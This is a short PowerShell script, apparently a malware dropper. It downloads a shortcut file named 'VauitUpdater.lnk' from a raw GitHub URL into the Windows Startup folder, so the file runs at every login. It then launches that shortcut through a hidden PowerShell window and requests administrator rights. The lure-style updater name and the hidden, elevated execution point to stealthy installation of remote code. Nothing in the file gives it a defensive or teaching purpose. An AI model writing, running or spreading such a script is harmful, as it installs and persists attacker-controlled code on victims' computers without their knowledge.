$url = "https://raw.githubusercontent.com/n7-1/5/refs/heads/main/VauitUpdater.lnk"
cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
$destPath = ".\VauitUpdater.lnk"
try {
    if (-not (Test-Path $destPath)) {
        # Используем -ErrorAction Stop, чтобы поймать ошибку в блоке catch
        Invoke-WebRequest -Uri $url -OutFile $destPath -ErrorAction Stop
    }
} catch {
    Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
}
Start-Process "powershell.exe" -ArgumentList '-WindowStyle Hidden -Command "Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\VauitUpdater.lnk" -WindowStyle Hidden"' -Verb RunAs
